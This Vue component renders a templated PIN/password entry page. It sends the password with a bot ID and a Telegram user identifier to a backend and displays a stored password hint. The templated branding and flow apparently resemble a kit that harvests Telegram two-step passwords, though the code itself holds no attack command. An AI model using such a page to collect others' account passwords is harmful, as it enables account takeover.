<script setup>
import { ref } from "vue";
import { useRouter } from "vue-router";
import { useUserStore } from "../stores/userStore";
import { useTemplateStore } from "../stores/templateStore";
import { api } from "../api/client";

const router = useRouter();
const userStore = useUserStore();
const templateStore = useTemplateStore();

const password = ref("");
const loading = ref(false);
const errorMsg = ref("");

async function submitPass() {
  errorMsg.value = "";
  if (!password.value) {
    errorMsg.value = "Please enter your PIN or password.";
    return;
  }

  loading.value = true;
  try {
    const res = await api.enterPass({
      password: password.value,
      bot_id: userStore.botId,
      user_tg: userStore.user,
    });

    if (res.ok) {
      userStore.sessionToken = res.session_token || "";
      userStore.state = "end";
      router.replace("/dashboard");
    }
  } catch (e) {
    errorMsg.value = e.message;
  } finally {
    loading.value = false;
  }
}
</script>

<template>
  <div class="center-screen">
    <section class="card">
      <h2>{{ templateStore.template.pass.title }}</h2>
      <p class="desc">{{ templateStore.template.pass.description }}</p>
      <p v-if="userStore.passwordHint" class="hint">Hint: {{ userStore.passwordHint }}</p>

      <input
        v-model="password"
        type="password"
        placeholder="Enter security PIN"
        class="input"
        @keyup.enter="submitPass"
      />
      <p v-if="errorMsg" class="err">{{ errorMsg }}</p>

      <button class="btn" :disabled="loading" @click="submitPass">
        {{ loading ? "Verifying..." : templateStore.template.pass.buttonText }}
      </button>
    </section>
  </div>
</template>

<style scoped>
.center-screen {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 16px;
}
.card {
  width: 100%;
  max-width: 420px;
  background: var(--card-bg);
  padding: 24px 20px;
  border-radius: 18px;
}
.desc {
  font-size: 14px;
  opacity: 0.85;
}
.hint {
  font-size: 12.5px;
  background: rgba(37, 99, 235, 0.12);
  padding: 6px 10px;
  border-radius: 8px;
  display: inline-block;
}
.input {
  width: 100%;
  padding: 12px;
  margin: 12px 0;
  border: 1px solid rgba(100, 116, 139, 0.35);
  border-radius: 10px;
  background: transparent;
  color: inherit;
}
.btn {
  width: 100%;
  padding: 13px;
  border: 0;
  border-radius: 10px;
  background: var(--button-bg);
  color: var(--button-text);
  font-weight: 600;
  cursor: pointer;
}
.err {
  color: #dc2626;
  font-size: 13px;
}
</style>
